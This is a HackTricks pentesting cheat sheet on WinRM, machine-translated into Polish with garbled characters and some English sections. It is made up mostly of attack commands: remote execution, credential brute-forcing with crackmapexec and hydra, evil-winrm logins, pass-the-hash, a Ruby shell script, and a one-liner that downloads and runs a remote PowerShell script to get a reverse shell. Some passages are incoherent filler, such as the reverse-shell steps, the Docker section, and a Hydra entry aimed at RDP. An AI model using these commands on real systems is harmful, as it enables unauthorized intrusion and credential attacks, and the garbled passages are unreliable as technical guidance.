# 5985,5986 - Testowanie penetracyjne WinRM

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hakerami i Å‚owcami nagrÃ³d za bÅ‚Ä™dy!

**SpostrzeÅ¼enia dotyczÄ…ce hakerstwa**\
Zajmuj siÄ™ treÅ›ciami, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania hakerstwa

**AktualnoÅ›ci na Å¼ywo z hakerstwa**\
BÄ…dÅº na bieÅ¼Ä…co z szybkim tempem Å›wiata hakerstwa dziÄ™ki aktualnym wiadomoÅ›ciom i spostrzeÅ¼eniom

**Najnowsze ogÅ‚oszenia**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi programami bug bounty i waÅ¼nymi aktualizacjami platformy

**DoÅ‚Ä…cz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hakerami juÅ¼ dziÅ›!

## WinRM

[Windows Remote Management (WinRM)](https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426\(v=vs.85\).aspx) jest **protokoÅ‚em opracowanym przez Microsoft**, ktÃ³ry umoÅ¼liwia **zdalne zarzÄ…dzanie systemami Windows** za pomocÄ… HTTP(S), wykorzystujÄ…c SOAP w procesie. Jest zasadniczo oparty na WMI i prezentuje siÄ™ jako interfejs oparty na HTTP do operacji WMI.

ObecnoÅ›Ä‡ WinRM na maszynie umoÅ¼liwia Å‚atwe zdalne zarzÄ…dzanie za pomocÄ… PowerShell, podobnie jak SSH dziaÅ‚a w innych systemach operacyjnych. Aby sprawdziÄ‡, czy WinRM jest aktywny, zaleca siÄ™ sprawdzenie otwarcia okreÅ›lonych portÃ³w:

* **5985/tcp (HTTP)**
* **5986/tcp (HTTPS)**

Otwarty port z powyÅ¼szej listy oznacza, Å¼e WinRM zostaÅ‚ skonfigurowany, umoÅ¼liwiajÄ…c prÃ³by rozpoczÄ™cia sesji zdalnej.

### **RozpoczÄ™cie sesji WinRM**

Aby skonfigurowaÄ‡ PowerShell dla WinRM, uÅ¼ywamy polecenia `Enable-PSRemoting` firmy Microsoft, ktÃ³re konfiguruje komputer do akceptowania zdalnych poleceÅ„ PowerShell. MajÄ…c podniesione uprawnienia PowerShell, moÅ¼na wykonaÄ‡ nastÄ™pujÄ…ce polecenia, aby wÅ‚Ä…czyÄ‡ tÄ™ funkcjonalnoÅ›Ä‡ i wyznaczyÄ‡ dowolny host jako zaufany:
```powershell
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
To podejÅ›cie polega na dodaniu symbolu wieloznacznego do konfiguracji `trustedhosts`, co wymaga ostroÅ¼nego rozwaÅ¼enia ze wzglÄ™du na jego implikacje. ZauwaÅ¼ono rÃ³wnieÅ¼, Å¼e moÅ¼e byÄ‡ konieczne zmienienie typu sieci z "Publiczna" na "Praca" na maszynie atakujÄ…cego.

Ponadto, WinRM moÅ¼na **aktywowaÄ‡ zdalnie** za pomocÄ… polecenia `wmic`, jak pokazano poniÅ¼ej:
```powershell
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
Ta metoda umoÅ¼liwia zdalne skonfigurowanie WinRM, zwiÄ™kszajÄ…c elastycznoÅ›Ä‡ zarzÄ…dzania maszynami z systemem Windows z daleka.


### SprawdÅº, czy jest skonfigurowane

Aby zweryfikowaÄ‡ konfiguracjÄ™ maszyny atakujÄ…cej, uÅ¼ywane jest polecenie `Test-WSMan`, ktÃ³re sprawdza, czy docelowy system ma poprawnie skonfigurowany WinRM. WykonujÄ…c to polecenie, powinieneÅ› otrzymaÄ‡ szczegÃ³Å‚y dotyczÄ…ce wersji protokoÅ‚u i wsmid, co wskazuje na poprawnÄ… konfiguracjÄ™. PoniÅ¼ej znajdujÄ… siÄ™ przykÅ‚ady przedstawiajÄ…ce oczekiwane wyniki dla skonfigurowanego celu i nieskonfigurowanego:

- Dla celu, ktÃ³ry **jest** poprawnie skonfigurowany, wynik bÄ™dzie wyglÄ…daÅ‚ podobnie jak:
```bash
Test-WSMan <target-ip>
```
OdpowiedÅº powinna zawieraÄ‡ informacje o wersji protokoÅ‚u i wsmid, co oznacza, Å¼e WinRM jest poprawnie skonfigurowany.

![](<../.gitbook/assets/image (161) (1).png>)

- W przypadku celu **nie** skonfigurowanego dla WinRM, nie bÄ™dzie takich szczegÃ³Å‚owych informacji, co wskazuje na brak poprawnej konfiguracji WinRM.

![](<../.gitbook/assets/image (162).png>)

### Wykonaj polecenie

Aby zdalnie wykonaÄ‡ polecenie `ipconfig` na maszynie docelowej i wyÅ›wietliÄ‡ jego wynik, wykonaj:
```powershell
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../.gitbook/assets/image (163) (1).png>)

MoÅ¼esz rÃ³wnieÅ¼ **wykonaÄ‡ polecenie z bieÅ¼Ä…cej konsoli PS za pomocÄ…** _**Invoke-Command**_. ZaÅ‚Ã³Å¼my, Å¼e masz lokalnie funkcjÄ™ o nazwie _**enumeration**_ i chcesz jÄ… **wykonaÄ‡ na zdalnym komputerze**, moÅ¼esz to zrobiÄ‡:
```powershell
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### Wykonaj skrypt

To execute a script on a target machine using WinRM, you can use the `Invoke-Command` cmdlet in PowerShell. This cmdlet allows you to run commands or scripts on remote machines.

```powershell
Invoke-Command -ComputerName <target> -ScriptBlock { <script> }
```

Replace `<target>` with the IP address or hostname of the target machine, and `<script>` with the script you want to execute.

For example, to execute a PowerShell script named `script.ps1` on a target machine with the IP address `192.168.1.100`, you would use the following command:

```powershell
Invoke-Command -ComputerName 192.168.1.100 -ScriptBlock { C:\path\to\script.ps1 }
```

Make sure to provide the correct path to the script on the target machine.

This method can be useful for automating tasks or executing commands on multiple machines simultaneously.
```powershell
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### Uzyskaj odwrÃ³conÄ… powÅ‚okÄ™

Aby uzyskaÄ‡ odwrÃ³conÄ… powÅ‚okÄ™, moÅ¼esz wykorzystaÄ‡ narzÄ™dzie `winrm` do zdalnego wykonywania poleceÅ„ na maszynie docelowej. PoniÅ¼ej przedstawiono kroki, ktÃ³re naleÅ¼y podjÄ…Ä‡:

1. Upewnij siÄ™, Å¼e masz dostÄ™p do maszyny docelowej i zainstaluj narzÄ™dzie `winrm` na swoim systemie.
2. Skonfiguruj `winrm` na maszynie docelowej, aby umoÅ¼liwiÄ‡ zdalne wykonywanie poleceÅ„. MoÅ¼esz to zrobiÄ‡ za pomocÄ… polecenia `winrm quickconfig` lub rÄ™cznie konfigurujÄ…c usÅ‚ugÄ™ `winrm`.
3. SprawdÅº, czy `winrm` jest aktywny na maszynie docelowej, wykonujÄ…c polecenie `winrm enumerate winrm/config/Listener`.
4. JeÅ›li `winrm` jest aktywny, uÅ¼yj narzÄ™dzia `winrs` lub `winrm` na swoim systemie, aby nawiÄ…zaÄ‡ poÅ‚Ä…czenie z maszynÄ… docelowÄ…. Na przykÅ‚ad, jeÅ›li chcesz uÅ¼yÄ‡ narzÄ™dzia `winrs`, wykonaj polecenie `winrs -r:http://<adres_ip>:5985 -u:<uÅ¼ytkownik> -p:<hasÅ‚o> <polecenie>`, gdzie `<adres_ip>` to adres IP maszyny docelowej, `<uÅ¼ytkownik>` to nazwa uÅ¼ytkownika, a `<hasÅ‚o>` to hasÅ‚o uÅ¼ytkownika.
5. Po nawiÄ…zaniu poÅ‚Ä…czenia moÅ¼esz wykonywaÄ‡ polecenia na maszynie docelowej, takie jak uruchamianie powÅ‚oki odwrÃ³conej. Na przykÅ‚ad, jeÅ›li chcesz uruchomiÄ‡ powÅ‚okÄ™ odwrÃ³conÄ… `cmd.exe`, wykonaj polecenie `cmd.exe`.

PamiÄ™taj, Å¼e uzyskanie odwrÃ³conej powÅ‚oki na maszynie docelowej jest nielegalne, jeÅ›li nie masz uprawnienia do tego. Upewnij siÄ™, Å¼e dziaÅ‚asz zgodnie z prawem i posiadasz odpowiednie uprawnienia przed przeprowadzeniem testÃ³w penetracyjnych.
```powershell
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### Uzyskaj sesjÄ™ PS

Aby uzyskaÄ‡ interaktywnÄ… powÅ‚okÄ™ PowerShell, uÅ¼yj polecenia `Enter-PSSession`:
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../.gitbook/assets/image (164).png>)

**Sesja zostanie uruchomiona w nowym procesie (wsmprovhost) wewnÄ…trz "ofiary"**

### **Wymuszanie otwarcia WinRM**

Aby korzystaÄ‡ z PS Remoting i WinRM, ale komputer nie jest skonfigurowany, moÅ¼na go wÅ‚Ä…czyÄ‡ za pomocÄ…:
```powershell
.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
### Zapisywanie i przywracanie sesji

To **nie zadziaÅ‚a**, jeÅ›li **jÄ™zyk** jest **ograniczony** na zdalnym komputerze.
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
WewnÄ…trz tych sesji moÅ¼esz zaÅ‚adowaÄ‡ skrypty PS za pomocÄ… _Invoke-Command_
```powershell
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### BÅ‚Ä™dy

JeÅ›li napotkasz nastÄ™pujÄ…cy bÅ‚Ä…d:

`enter-pssession : PoÅ‚Ä…czenie z zdalnym serwerem 10.10.10.175 nie powiodÅ‚o siÄ™ z nastÄ™pujÄ…cÄ… wiadomoÅ›ciÄ… o bÅ‚Ä™dzie: Klient WinRM nie moÅ¼e przetworzyÄ‡ Å¼Ä…dania. JeÅ›li schemat uwierzytelniania rÃ³Å¼ni siÄ™ od Kerberos lub jeÅ›li komputer klienta nie jest doÅ‚Ä…czony do domeny, naleÅ¼y uÅ¼yÄ‡ transportu HTTPS lub dodaÄ‡ maszynÄ™ docelowÄ… do ustawienia konfiguracji TrustedHosts. UÅ¼yj polecenia winrm.cmd, aby skonfigurowaÄ‡ TrustedHosts. NaleÅ¼y zauwaÅ¼yÄ‡, Å¼e komputery znajdujÄ…ce siÄ™ na liÅ›cie TrustedHosts mogÄ… nie byÄ‡ uwierzytelnione. WiÄ™cej informacji na ten temat moÅ¼na uzyskaÄ‡, wykonujÄ…c nastÄ™pujÄ…ce polecenie: winrm help config. Aby uzyskaÄ‡ wiÄ™cej informacji, zobacz temat Pomoc dotyczÄ…cy rozwiÄ…zywania problemÃ³w zwiÄ…zanych z zdalnym dostÄ™pem (about_Remote_Troubleshooting).`

SprÃ³buj na kliencie (informacje z [tutaj](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)):
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hakerami i Å‚owcami bÅ‚Ä™dÃ³w!

**WglÄ…d w Hacking**\
Zajmuj siÄ™ treÅ›ciami, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania zwiÄ…zane z hakowaniem

**AktualnoÅ›ci na Å¼ywo o Hackingu**\
BÄ…dÅº na bieÅ¼Ä…co z szybkim tempem Å›wiata hakowania dziÄ™ki aktualnym wiadomoÅ›ciom i wglÄ…dowi

**Najnowsze OgÅ‚oszenia**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi programami bug bounty i waÅ¼nymi aktualizacjami platformy

**DoÅ‚Ä…cz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hakerami juÅ¼ dziÅ›!

## PoÅ‚Ä…czenie WinRM w systemie Linux

### Atak Brute Force

BÄ…dÅº ostroÅ¼ny, atak brute-force na WinRM moÅ¼e zablokowaÄ‡ uÅ¼ytkownikÃ³w.
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### UÅ¼ywanie evil-winrm

Evil-winrm to narzÄ™dzie, ktÃ³re umoÅ¼liwia zdalne wykonywanie poleceÅ„ na zdalnym serwerze Windows, wykorzystujÄ…c protokÃ³Å‚ WinRM (Windows Remote Management). DziaÅ‚a podobnie jak narzÄ™dzie PowerShell Remoting, ale oferuje dodatkowe funkcje i uÅ‚atwienia.

Aby uÅ¼yÄ‡ evil-winrm, naleÅ¼y najpierw zainstalowaÄ‡ go na swoim systemie. MoÅ¼na to zrobiÄ‡ za pomocÄ… narzÄ™dzia RubyGems, wykonujÄ…c polecenie:

```
gem install evil-winrm
```

Po zainstalowaniu narzÄ™dzia, moÅ¼na go uruchomiÄ‡, podajÄ…c odpowiednie parametry, takie jak adres IP lub nazwa hosta zdalnego serwera, nazwa uÅ¼ytkownika i hasÅ‚o. PrzykÅ‚adowe polecenie wyglÄ…da nastÄ™pujÄ…co:

```
evil-winrm -i <adres_IP_lub_nazwa_hosta> -u <nazwa_uÅ¼ytkownika> -p <hasÅ‚o>
```

Po nawiÄ…zaniu poÅ‚Ä…czenia z serwerem, moÅ¼na wykonywaÄ‡ polecenia na zdalnym systemie Windows, takie jak przeglÄ…danie plikÃ³w, uruchamianie skryptÃ³w, zmiana ustawieÅ„ systemowych itp.

Evil-winrm oferuje rÃ³wnieÅ¼ funkcje takie jak przesyÅ‚anie plikÃ³w miÄ™dzy lokalnym systemem a zdalnym serwerem, zdalne wykonywanie poleceÅ„ w tle oraz interaktywny tryb sesji, ktÃ³ry umoÅ¼liwia interakcjÄ™ z systemem zdalnym w czasie rzeczywistym.

NaleÅ¼y jednak pamiÄ™taÄ‡, Å¼e uÅ¼ywanie evil-winrm do nieautoryzowanego dostÄ™pu do systemÃ³w jest nielegalne i narusza prywatnoÅ›Ä‡ innych osÃ³b. NarzÄ™dzie to powinno byÄ‡ uÅ¼ywane wyÅ‚Ä…cznie w celach pentestingu lub w ramach legalnych dziaÅ‚aÅ„ zwiÄ…zanych z administracjÄ… systemÃ³w.
```ruby
gem install evil-winrm
```
Przeczytaj **dokumentacjÄ™** na jego githubie: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
Aby uÅ¼yÄ‡ evil-winrm do poÅ‚Ä…czenia z adresem IPv6, utwÃ³rz wpis wewnÄ…trz **/etc/hosts**, ustawiajÄ…c nazwÄ™ domeny na adres IPv6, a nastÄ™pnie poÅ‚Ä…cz siÄ™ z tÄ… domenÄ….

### Przekazanie skrÃ³tu hasÅ‚a z uÅ¼yciem evil-winrm
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
### UÅ¼ywanie maszyny PS-docker

To use a PS-docker machine, you need to have Docker installed on your system. Docker is a platform that allows you to automate the deployment and management of applications using containers. Once you have Docker installed, you can follow the steps below to set up and use a PS-docker machine for pentesting purposes.

1. First, create a new PS-docker machine by running the following command:

   ```
   docker-machine create --driver hyperv --hyperv-virtual-switch "Virtual Switch" ps-docker
   ```

   This command will create a new PS-docker machine using the Hyper-V driver and the specified virtual switch.

2. Once the machine is created, you can start it by running the following command:

   ```
   docker-machine start ps-docker
   ```

   This command will start the PS-docker machine.

3. To connect to the PS-docker machine, run the following command:

   ```
   docker-machine env ps-docker | Invoke-Expression
   ```

   This command will set the environment variables required to connect to the PS-docker machine.

4. Finally, you can use the PS-docker machine by running the following command:

   ```
   docker run -it --rm mcr.microsoft.com/powershell
   ```

   This command will start a PowerShell container on the PS-docker machine.

By following these steps, you can set up and use a PS-docker machine for pentesting purposes. This allows you to leverage the power of Docker and PowerShell for your hacking activities.
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### UÅ¼ywanie skryptu ruby

**Kod wydobyty stÄ…d: [https://alamot.github.io/winrm\_shell/](https://alamot.github.io/winrm\_shell/)**
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
# https://alamot.github.io/winrm_shell/


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

* `port:5985 Microsoft-HTTPAPI`

## Referencje

* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## Automatyczne polecenia HackTricks
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p â€˜MySuperSecr3tPass123!â€™

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.xyz/pentesting/pentesting-winrm

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hakerami i Å‚owcami bÅ‚Ä™dÃ³w!

**SpostrzeÅ¼enia dotyczÄ…ce hakerstwa**\
Zajmuj siÄ™ treÅ›ciami, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania hakerstwa.

**AktualnoÅ›ci na Å¼ywo o hakerstwie**\
BÄ…dÅº na bieÅ¼Ä…co z szybkim tempem Å›wiata hakerstwa dziÄ™ki aktualnym wiadomoÅ›ciom i spostrzeÅ¼eniom.

**Najnowsze ogÅ‚oszenia**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi programami bug bounty i waÅ¼nymi aktualizacjami platformy.

**DoÅ‚Ä…cz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hakerami juÅ¼ dziÅ›!

<details>

<summary><strong>Naucz siÄ™ hakerstwa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
